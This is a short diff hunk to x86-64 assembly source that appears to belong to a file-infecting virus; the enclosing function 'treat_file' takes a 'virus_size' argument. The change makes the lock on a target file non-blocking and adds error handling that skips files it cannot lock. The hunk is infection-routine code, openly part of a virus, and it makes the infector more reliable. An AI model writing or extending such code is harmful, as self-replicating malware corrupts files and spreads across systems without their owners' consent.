@@ -120,8 +120,12 @@ _treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *fu
 	; Now we lock the file to avoid concurrence
 	mov rax, SYS_FLOCK
 	mov rdi, QWORD [rsp]
-	mov rsi, LOCK_EX
+	mov rsi, LOCK_EX | LOCK_NB
 	syscall
+	lea r10, [rel _not_ok_end]
+	mov QWORD [rsp + 104], r10
+	cmp rax, 0
+	jne _close_file
 
 	mov rdi, QWORD [rsp]
 		mov r10, QWORD [rsp + 96]
